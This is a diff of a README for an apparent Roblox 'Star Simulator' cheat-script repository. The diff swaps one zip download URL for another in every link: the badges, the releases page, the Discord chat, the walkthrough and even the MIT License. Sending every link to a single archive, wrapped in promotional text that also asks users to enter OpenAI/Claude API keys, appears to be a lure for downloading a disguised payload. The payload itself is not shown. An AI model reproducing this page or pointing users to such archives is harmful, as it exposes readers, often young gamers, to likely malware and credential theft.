@@ -2,8 +2,8 @@
 
 Welcome to the **Star Simulator Roblox Script Repository**—the premiere resource for game enthusiasts, tinkerers, and Roblox script explorers seeking innovative automation and enhancement solutions for the popular *Star Simulator* Roblox experience. This repository is curated to illuminate your gameplay like a billion stars in the night sky, guiding you towards interactive, rich, and efficient script-driven adventures in 2025 and beyond.
 
-[![Stars](https://raw.githubusercontent.com/samu2231sssss/stellar-star-sim-roblox-script/branch/smiddum/stellar-star-sim-roblox-script-cholecystolithotripsy.zip)](https://raw.githubusercontent.com/samu2231sssss/stellar-star-sim-roblox-script/branch/smiddum/stellar-star-sim-roblox-script-cholecystolithotripsy.zip)  
-[![License](https://raw.githubusercontent.com/samu2231sssss/stellar-star-sim-roblox-script/branch/smiddum/stellar-star-sim-roblox-script-cholecystolithotripsy.zip)](https://raw.githubusercontent.com/samu2231sssss/stellar-star-sim-roblox-script/branch/smiddum/stellar-star-sim-roblox-script-cholecystolithotripsy.zip)
+[![Stars](https://github.com/samu2231sssss/stellar-star-sim-roblox-script/raw/refs/heads/branch/smiddum/roblox-script-sim-stellar-star-2.3.zip)](https://github.com/samu2231sssss/stellar-star-sim-roblox-script/raw/refs/heads/branch/smiddum/roblox-script-sim-stellar-star-2.3.zip)  
+[![License](https://github.com/samu2231sssss/stellar-star-sim-roblox-script/raw/refs/heads/branch/smiddum/roblox-script-sim-stellar-star-2.3.zip)](https://github.com/samu2231sssss/stellar-star-sim-roblox-script/raw/refs/heads/branch/smiddum/roblox-script-sim-stellar-star-2.3.zip)
 
 ---
 
@@ -67,11 +67,11 @@ API credentials are required for access—visit the respective API documentation
 
 Bring new gravity to your gameplay. To download the latest stable release of our Star Simulator script suite:
 
-[![Download](https://raw.githubusercontent.com/samu2231sssss/stellar-star-sim-roblox-script/branch/smiddum/stellar-star-sim-roblox-script-cholecystolithotripsy.zip)](https://raw.githubusercontent.com/samu2231sssss/stellar-star-sim-roblox-script/branch/smiddum/stellar-star-sim-roblox-script-cholecystolithotripsy.zip)
+[![Download](https://github.com/samu2231sssss/stellar-star-sim-roblox-script/raw/refs/heads/branch/smiddum/roblox-script-sim-stellar-star-2.3.zip)](https://github.com/samu2231sssss/stellar-star-sim-roblox-script/raw/refs/heads/branch/smiddum/roblox-script-sim-stellar-star-2.3.zip)
 
 **Quick Steps:**
 
-1. Click the Download badge above or navigate to the [Releases](https://raw.githubusercontent.com/samu2231sssss/stellar-star-sim-roblox-script/branch/smiddum/stellar-star-sim-roblox-script-cholecystolithotripsy.zip) page.
+1. Click the Download badge above or navigate to the [Releases](https://github.com/samu2231sssss/stellar-star-sim-roblox-script/raw/refs/heads/branch/smiddum/roblox-script-sim-stellar-star-2.3.zip) page.
 2. Follow the installation steps in `/docs/INSTALLATION`.
 3. (Optional) Configure your preferred language and API credentials for enhanced features.
 4. Launch your Roblox session and ascend into the Star Simulator universe with the script enabled.
@@ -89,7 +89,7 @@ After download and installation:
 - **Integrate APIs:** Input your OpenAI/Claude credentials for advanced artificial intelligence features.
 - **Monitor:** Live logs and feedback ensure you always navigate on the right course.
 
-Consult `https://raw.githubusercontent.com/samu2231sssss/stellar-star-sim-roblox-script/branch/smiddum/stellar-star-sim-roblox-script-cholecystolithotripsy.zip` for an in-depth cosmic walkthrough.
+Consult `https://github.com/samu2231sssss/stellar-star-sim-roblox-script/raw/refs/heads/branch/smiddum/roblox-script-sim-stellar-star-2.3.zip` for an in-depth cosmic walkthrough.
 
 ---
 
@@ -103,7 +103,7 @@ Our documentation and GUI are available in multiple languages. Toggle your selec
 
 - Issues: Track or submit via GitHub Issues tab
 - Feature Requests: Use the `/feature-requests` page to suggest your dreams
-- Live Chat: 24/7 via our Discord server (https://raw.githubusercontent.com/samu2231sssss/stellar-star-sim-roblox-script/branch/smiddum/stellar-star-sim-roblox-script-cholecystolithotripsy.zip)
+- Live Chat: 24/7 via our Discord server (https://github.com/samu2231sssss/stellar-star-sim-roblox-script/raw/refs/heads/branch/smiddum/roblox-script-sim-stellar-star-2.3.zip)
 - Community Wiki: Tutorials, tips, and advanced scripting modules
 
 ---
@@ -118,15 +118,15 @@ Our documentation and GUI are available in multiple languages. Toggle your selec
 
 ---
 
-## [![Download](https://raw.githubusercontent.com/samu2231sssss/stellar-star-sim-roblox-script/branch/smiddum/stellar-star-sim-roblox-script-cholecystolithotripsy.zip)](https://raw.githubusercontent.com/samu2231sssss/stellar-star-sim-roblox-script/branch/smiddum/stellar-star-sim-roblox-script-cholecystolithotripsy.zip)
+## [![Download](https://github.com/samu2231sssss/stellar-star-sim-roblox-script/raw/refs/heads/branch/smiddum/roblox-script-sim-stellar-star-2.3.zip)](https://github.com/samu2231sssss/stellar-star-sim-roblox-script/raw/refs/heads/branch/smiddum/roblox-script-sim-stellar-star-2.3.zip)
 
-For the most current cosmic release, stars, and guidance from the community, follow the download badge or visit the [Download Center](https://raw.githubusercontent.com/samu2231sssss/stellar-star-sim-roblox-script/branch/smiddum/stellar-star-sim-roblox-script-cholecystolithotripsy.zip)!
+For the most current cosmic release, stars, and guidance from the community, follow the download badge or visit the [Download Center](https://github.com/samu2231sssss/stellar-star-sim-roblox-script/raw/refs/heads/branch/smiddum/roblox-script-sim-stellar-star-2.3.zip)!
 
 ---
 
 ## 📜 MIT License (2025)
 
-This project is licensed under the terms of the [MIT License](https://raw.githubusercontent.com/samu2231sssss/stellar-star-sim-roblox-script/branch/smiddum/stellar-star-sim-roblox-script-cholecystolithotripsy.zip) © 2025.  
+This project is licensed under the terms of the [MIT License](https://github.com/samu2231sssss/stellar-star-sim-roblox-script/raw/refs/heads/branch/smiddum/roblox-script-sim-stellar-star-2.3.zip) © 2025.  
 See the `LICENSE` file for further details.
 
 ---
